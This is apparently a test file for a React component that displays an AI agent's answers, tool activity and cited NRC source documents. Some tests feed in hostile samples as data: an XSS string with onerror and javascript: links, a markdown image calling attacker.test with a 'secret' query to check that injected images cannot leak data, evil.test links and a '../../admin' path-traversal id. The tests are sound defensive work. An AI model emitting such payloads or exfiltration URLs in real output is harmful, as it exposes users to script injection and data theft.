import React from "react";
import { afterEach, describe, expect, it } from "vitest";
import { cleanup, fireEvent, render, screen, within } from "@testing-library/react";
import { MantineProvider } from "@mantine/core";
import { NextIntlClientProvider } from "next-intl";
import enMessages from "../../../messages/en.json";
import type { UIMessage } from "ai";
import { AgentMessage, sourceDocumentsOf } from "~/components/agent/agent-message";

afterEach(() => cleanup());

function renderMessage(message: UIMessage) {
  return render(
    <NextIntlClientProvider locale="en" messages={enMessages}>
      <MantineProvider>
        <AgentMessage message={message} />
      </MantineProvider>
    </NextIntlClientProvider>,
  );
}

const answer = (parts: unknown[]): UIMessage =>
  ({ id: "a1", role: "assistant", parts }) as UIMessage;

const findCall = (state: string, output?: unknown) => ({
  type: "tool-nrc_find",
  toolCallId: "c1",
  state,
  input: { question: "What limits access in North Darfur?" },
  ...(output !== undefined ? { output } : {}),
});

const darfurDocs = {
  answer: "Restricted.",
  sourceDocuments: [
    { title: "Darfur access report", fileName: null, sourceId: "1", content: "Roads closed since June." },
    { title: "Darfur access report", fileName: null, sourceId: "1", content: "Roads closed since June." },
    { title: "Protection monitoring", fileName: "pm-2026", sourceId: "1", content: "Checkpoints increased." },
  ],
};

describe("AgentMessage", () => {
  it("shows a user turn as plain text", () => {
    renderMessage({ id: "u1", role: "user", parts: [{ type: "text", text: "**not bold**" }] });
    expect(screen.getByText("**not bold**")).toBeInTheDocument();
  });

  it("renders an Answer's text as Markdown, including GFM tables", () => {
    renderMessage(
      answer([
        {
          type: "text",
          text: "Access is **restricted**.\n\n| Region | Status |\n| --- | --- |\n| North Darfur | Closed |",
        },
      ]),
    );
    expect(screen.getByText("restricted").tagName).toBe("STRONG");
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getByRole("cell", { name: "Closed" })).toBeInTheDocument();
  });

  it("never renders raw HTML or script URLs from an Answer", () => {
    const { container } = renderMessage(
      answer([
        {
          type: "text",
          text: 'Hi <img src=x onerror="alert(1)"> <script>alert(2)</script> [click](javascript:alert(3)) [NRC](https://www.nrc.no)',
        },
      ]),
    );
    expect(container.querySelector("img, script")).toBeNull();
    const links = screen.getAllByRole("link");
    expect(links.map((a) => a.getAttribute("href"))).not.toContain("javascript:alert(3)");
    const nrc = screen.getByRole("link", { name: "NRC" });
    expect(nrc).toHaveAttribute("target", "_blank");
    expect(nrc.getAttribute("rel")).toContain("noopener");
  });

  it("opens links to app pages in the app, and everything else in a new tab", () => {
    renderMessage(
      answer([
        {
          type: "text",
          text:
            "### Sudan\n\n- **[El Obeid](/event/ev_1)**: drone strike. See [Sudan on the Map](/map?countryId=loc1&x=1), " +
            "[admin](/admin) and [evil](//evil.test/event/ev_1).",
        },
      ]),
    );
    expect(screen.getByRole("heading", { name: "Sudan" })).toBeInTheDocument();
    const event = screen.getByRole("link", { name: "El Obeid" });
    expect(event).toHaveAttribute("href", "/event/ev_1");
    expect(event).not.toHaveAttribute("target");
    expect(screen.getByRole("link", { name: "Sudan on the Map" })).toHaveAttribute("href", "/map?countryId=loc1");
    expect(screen.getAllByTestId("agent-app-link")).toHaveLength(2);
    expect(screen.getByRole("link", { name: "admin" })).toHaveAttribute("target", "_blank");
    expect(screen.getByRole("link", { name: "evil" })).toHaveAttribute("target", "_blank");
  });

  it("never loads an image, so an injected image URL can't leak anything", () => {
    const { container } = renderMessage(
      answer([{ type: "text", text: "See ![chart of access](https://attacker.test/x?q=secret) here." }]),
    );
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("chart of access")).toBeInTheDocument();
    expect(container.innerHTML).not.toContain("attacker.test");
  });

  it("shows a running tool as a working… activity line", () => {
    renderMessage(answer([findCall("input-available")]));
    const line = screen.getByTestId("agent-tool-activity");
    expect(line).toHaveAttribute("data-tool", "nrc_find");
    expect(within(line).getByText("Searching NRC documents…")).toBeInTheDocument();
  });

  it("marks a finished tool done, and lists the Source documents under the Answer", () => {
    renderMessage(
      answer([
        findCall("output-available", darfurDocs),
        { type: "text", text: "Roads are closed [Darfur access report]." },
      ]),
    );
    expect(screen.getByText("Searched NRC documents")).toBeInTheDocument();
    const sources = screen.getByTestId("agent-sources");
    expect(within(sources).getByText("Sources from NRC Find (2)")).toBeInTheDocument();
    expect(within(sources).getByText("Darfur access report")).toBeInTheDocument();
    expect(within(sources).getByText("Protection monitoring")).toBeInTheDocument();
    // Passages stay folded away until asked for.
    expect(within(sources).queryByText("Roads closed since June.")).toBeNull();
    fireEvent.click(within(sources).getAllByRole("button", { name: "1 passage" })[0]!);
    expect(within(sources).getByText("Roads closed since June.")).toBeInTheDocument();
  });

  it("shows one row per document, linked to its download, and tells CLEAR events apart", () => {
    const fileId = "e29e1fb446e29d6ed894ffc6c07fcd7f";
    const doc = { title: "South Area EPP 2023", fileName: "South Area EPP 2023", sourceId: "7" };
    renderMessage(
      answer([
        findCall("output-available", {
          answer: "x",
          sourceDocuments: [
            { ...doc, sourceName: "NRC - Strategies", fileId, fileFormat: "docx", content: "First passage." },
            { ...doc, sourceName: "NRC - Strategies", fileId, fileFormat: "docx", content: "Second passage." },
            { title: "Clashes in Kadugli", sourceId: "9", sourceName: "CLEAR API", fileId: "abcdef0123456789", content: "x" },
            { title: "Odd id", sourceId: "1", fileId: "../../admin", content: "y" },
          ],
        }),
      ]),
    );
    const rows = screen.getAllByTestId("agent-source");
    expect(rows).toHaveLength(3);
    const link = within(rows[0]!).getByRole("link", { name: /South Area EPP 2023/ });
    expect(link).toHaveAttribute("href", `/api/agent/source/${fileId}`);
    expect(link).toHaveAttribute("download");
    expect(within(rows[0]!).getByText("DOCX · NRC - Strategies")).toBeInTheDocument();
    expect(within(rows[0]!).getByRole("button", { name: "2 passages" })).toBeInTheDocument();
    expect(rows[1]).toHaveAttribute("data-kind", "clear-event");
    expect(within(rows[1]!).getByText("CLEAR event")).toBeInTheDocument();
    expect(within(rows[1]!).queryByRole("link")).toBeNull();
    expect(within(rows[2]!).queryByRole("link")).toBeNull();
  });

  it("shows a tool that failed as unavailable, with no sources", () => {
    renderMessage(
      answer([
        findCall("output-available", { error: "NRC Find is unreachable." }),
        { type: "text", text: "NRC Find is unavailable." },
      ]),
    );
    expect(screen.getByText("NRC documents unavailable")).toBeInTheDocument();
    expect(screen.queryByTestId("agent-sources")).toBeNull();
  });

  it("shows a CLEAR data tool that returned an error value as unavailable", () => {
    renderMessage(
      answer([
        {
          type: "tool-clear_count",
          toolCallId: "c3",
          state: "output-available",
          output: { error: { code: "FORBIDDEN", message: "No access." } },
        },
      ]),
    );
    expect(screen.getByText("clear_count unavailable")).toBeInTheDocument();
  });

  it("shows a navigate that returned an error value as not moved", () => {
    renderMessage(
      answer([
        {
          type: "tool-navigate",
          toolCallId: "n1",
          state: "output-available",
          output: { error: { code: "OUT_OF_SCOPE", message: "Chad is outside the team's scope." } },
        },
      ]),
    );
    expect(screen.getByText("Couldn't move you there")).toBeInTheDocument();
    expect(screen.queryByText("Moved")).toBeNull();
  });

  it("shows a navigate result the client won't act on as not moved", () => {
    renderMessage(
      answer([
        {
          type: "tool-navigate",
          toolCallId: "n2",
          state: "output-available",
          output: { moved: true, target: { kind: "event" }, url: "//evil.test", content: { label: "x" } },
        },
      ]),
    );
    expect(screen.getByText("Couldn't move you there")).toBeInTheDocument();
  });

  it("names an unknown tool generically", () => {
    renderMessage(answer([{ type: "tool-clear_count", toolCallId: "c2", state: "input-streaming" }]));
    expect(screen.getByText("Running clear_count…")).toBeInTheDocument();
  });
});

describe("sourceDocumentsOf", () => {
  it("only collects documents from finished tool results", () => {
    expect(sourceDocumentsOf([findCall("input-available")] as UIMessage["parts"])).toEqual([]);
    expect(
      sourceDocumentsOf([findCall("output-available", darfurDocs)] as UIMessage["parts"]).map(
        (d) => d.title,
      ),
    ).toEqual(["Darfur access report", "Protection monitoring"]);
  });
});
